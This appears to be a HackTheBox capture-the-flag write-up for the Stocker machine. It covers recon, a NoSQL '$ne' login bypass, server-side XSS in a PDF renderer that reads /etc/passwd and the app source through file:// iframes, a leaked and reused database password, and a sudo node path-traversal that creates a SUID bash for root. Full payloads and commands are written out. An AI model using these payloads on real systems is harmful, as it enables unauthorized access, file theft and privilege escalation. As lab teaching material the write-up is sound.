---
layout: post
title: "HTB: Stocker"
subtitle: "NoSQL auth bypass into a server-side XSS PDF LFI that leaked a reused dbURI password, then a sudo node wildcard path traversal to root"
date: 2023-02-02
tags: [htb, linux, nosql-injection, xss, lfi, privesc]
category: writeups
kind: machine
tldr: "An Express/Mongo dev vhost fell to a NoSQL auth bypass that reached the order API. The order title got rendered into a generated PDF, so an iframe pointed at a local file read index.js and leaked the Mongo dbURI password. That password was reused for SSH, and a sudo grant on node with a wildcard path let me traverse out and run my own script as root."
---

## the box

Stocker is an easy Linux box from HackTheBox. It runs OpenSSH 8.2p1 (Ubuntu 4ubuntu0.5) and nginx 1.18.0 on Ubuntu 20.04. The front door is a static brochure site for a watch company. The real surface hides on a `dev.` vhost: an Express application backed by MongoDB. The whole chain is a web one, NoSQL injection into the authenticated area, server-side XSS in a PDF renderer used for arbitrary file read, a reused password from source, and a sudo rule on `node` that never accounted for path traversal.

I worked it in four moves. Bypass the login with a Mongo operator, reach the order API, abuse the headless-Chromium PDF generator to read `index.js`, reuse the Mongo password over SSH, then walk `../` out of a fixed sudo path to run my own JavaScript as root.

## recon

I started with a full TCP scan and then a service/script scan on the open ports.

```bash
nmap -p- --min-rate 10000 -T4 10.129.130.204
nmap -p 22,80 -sCV 10.129.130.204
```

Two ports, nothing else.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The OpenSSH and nginx versions are the stock Ubuntu 20.04 builds, so nothing there to exploit. The HTTP title told me port 80 redirects to `stocker.htb`, so I added the hostname to `/etc/hosts` and browsed it.

```bash
echo '10.129.130.204 stocker.htb dev.stocker.htb' | sudo tee -a /etc/hosts
```

The root host served a static template. The footer credited templatedeck.com and the page was built with Eleventy v2.0.0, so it was a generated brochure with no dynamic backend. A quick content scan found only the asset directories, all 301 redirects to themselves:

```
/img    (Status: 301) [Size: 178] [--> http://stocker.htb/img/]
/css    (Status: 301) [Size: 178] [--> http://stocker.htb/css/]
/js     (Status: 301) [Size: 178] [--> http://stocker.htb/js/]
/fonts  (Status: 301) [Size: 178] [--> http://stocker.htb/fonts/]
```

A flat static site with nothing dynamic means the interesting code is somewhere else. The usual next step is virtual host discovery: fuzz the `Host` header and watch for a response that differs from the default.

```bash
ffuf -u http://10.129.130.204 -H "Host: FUZZ.stocker.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

`-ac` autocalibrates against the wildcard response, so the only hit that survived was `dev`. `dev.stocker.htb` returned a 302 redirect to `/login`, which is already a different application from the static root.

Browsing `dev.stocker.htb` landed on a login form. The login page JavaScript handled error display from the query string, which told me the app uses `?error=login-failed` style redirects:

```js
const urlParams = new URLSearchParams(location.search);
const errorAlert = document.getElementById("error-alert");
if (urlParams.has("error")) {
  const error = urlParams.get("error");
  errorAlert.style.display = "";
  if (error === "login-failed") errorAlert.innerText = "Invalid username or password.";
  if (error === "auth-required") errorAlert.innerText = "You must be authenticated to access this page.";
  window.history.pushState({}, document.title, "/login");
}
```

The response carried the header that decided the rest of the box:

```
X-Powered-By: Express
```

Express means Node, and a Node login form backed by a document database is the textbook setup for NoSQL injection. When the backend builds a Mongo query straight from the request body and the body can be JSON, you can smuggle query operators instead of strings.

## foothold

The login form posts `username` and `password`. By default a browser sends them URL-encoded, which Mongo treats as plain string equality. The trick is to switch the body to JSON so I can pass an object that Mongo interprets as a query operator. I intercepted the login POST, changed the content type, and replaced the password value with `$ne`:

```
Content-Type: application/json
```

```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

`$ne` is Mongo's "not equal" operator. `findOne({username:{$ne:null}, password:{$ne:null}})` returns the first document where both fields are not null, which is just the first real user in the collection. No password needed. The server set a session cookie and redirected to `/stock`. That confirmed the vulnerability and put me inside the authenticated shop. Later I read the source and saw exactly why it worked:

```js
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/login?error=login-error");
  // TODO: Implement hashing
  const user = await mongoose.model("User").findOne({ username, password });
  if (!user) return res.redirect("/login?error=login-error");
  req.session.user = user.id;
  return res.redirect("/stock");
});
```

`{ username, password }` is dropped directly into `findOne`, so an attacker-controlled object becomes the query. The `// TODO: Implement hashing` comment is a bonus, passwords are compared in plaintext.

The authenticated app is a small shop. `GET /api/products` listed the catalog as JSON. The flow is: add items to a basket, then `POST /api/order` with a basket array. The server replied with an order ID and redirected to `/api/po/<id>`, which rendered the order into a purchase-order PDF.

A server that turns my input into a PDF is worth a hard look, because headless PDF renderers are usually a full browser engine. Stocker renders with a Chromium/Skia backend, which means HTML in the order fields is parsed and any JavaScript in it executes server-side. That is server-side XSS, and a browser running on the server can read local files through `file://`.

I built an order where the `title` of a basket item carried HTML. The title is the field reflected into the PDF, so it is the injection point. A `<script>`-free `onerror` handler writes an iframe that points at a local file:

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<img src=x onerror=\"document.write('<iframe src=file:///etc/passwd width=100% height=100%></iframe>')\">",
      "price": 0,
      "amount": 1
    }
  ]
}
```

I fetched the generated PDF at `/api/po/<id>` and `/etc/passwd` was rendered inside it. That confirmed both code execution in the renderer and arbitrary local file read. A plain static `<iframe src=file:///etc/passwd>` in the title also works, but routing it through `<img onerror>` proves the renderer is executing script and not just parsing markup.

```
root:x:0:0:root:/root:/bin/bash
...
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

`angoose` was the only human user with a real shell. The `_laurel` account is the userland audit-log component, which usually means the box is logging my actions, but it does not block anything.

## user

File read on a Node app means I should read the app source, because Node projects keep configuration and database credentials in the entry script. I pointed the same iframe primitive at the app directory:

```html
<iframe src=file:///var/www/dev/index.js height=1000px width=800px></iframe>
```

Wrapping it back into an order title:

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<iframe src=file:///var/www/dev/index.js height=1000px width=800px></iframe>",
      "price": 0,
      "amount": 1
    }
  ]
}
```

The rendered PDF carried `index.js`, and the Mongo connection string sat near the top with credentials inline:

```js
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

The same file confirmed the login was injectable and that `/api/order` and `/api/products` both gate on `req.session.user`, which is why the NoSQL bypass was the only thing standing between me and the order endpoint.

Reused credentials are the natural next guess. The Mongo password `IHeardPassphrasesArePrettySecure` worked as the system password for `angoose` over SSH:

```bash
ssh angoose@stocker.htb
```

That dropped me to a shell and the user flag was in the home directory.

## root

There was no SUID binary to abuse, and the polkit `CVE-2021-3560` privilege escalation looked applicable on this Ubuntu build but did not fire here, so I dropped it and moved on. First I checked sudo:

```bash
sudo -l
```

`angoose` was allowed to run `node` against a JavaScript file under a fixed directory, with a wildcard for the filename:

```
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

The intent is obvious: only run the maintenance scripts that live in `/usr/local/scripts`. The wildcard only matches `*.js`, so I cannot drop a script directly into that directory (it is root-owned), and I cannot change the binary. The flaw is that the wildcard does not stop `/`. The shell expands `*.js` against the filesystem, but more importantly `node` will happily resolve any path it is handed, including one that walks out of the scripts directory with `../`.

I wrote my own script in my home directory. The cleanest payload makes a SUID copy of bash so I get a stable root shell rather than a one-shot reverse connection:

```js
require('child_process').exec('cp /bin/bash /tmp/bash; chmod +s /tmp/bash');
```

Then I invoked the sudo rule with a path that starts inside `/usr/local/scripts`, satisfying the literal prefix, but traverses back to `/` and down into my home where the script actually lives:

```bash
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/rev.js
```

The `../../../` from `/usr/local/scripts` climbs to `/`, then descends into `/home/angoose/rev.js`. The path still ends in `.js` so the sudoers pattern is satisfied, and `node` runs my file as root. The SUID bash dropped me to root:

```bash
/tmp/bash -p
```

`-p` keeps the effective UID, so I had a root shell and read the root flag. A reverse shell node script works too, but the SUID copy is less fragile.

## takeaway

The whole front half is one missing input boundary repeated three times. The login passed a user-controlled JSON object straight into a Mongo query, so one `$ne` operator turned a password check into "match any user." The order title was reflected into a server-rendered PDF built on a real browser engine, so HTML in that field became script execution and `file://` became arbitrary file read. And the Mongo password was stored in source and reused for the system account, which collapsed a web-app file read into an interactive shell.

The root step looked locked down. A fixed binary, a fixed directory, and a narrow `*.js` wildcard read like a careful sudoers entry. But a wildcard is not a sandbox: it constrains the filename, not the path, and `node` resolves `../` like any other program. Anchoring the rule to an absolute, canonicalized path, or only ever allowing specific named scripts, would have closed it.
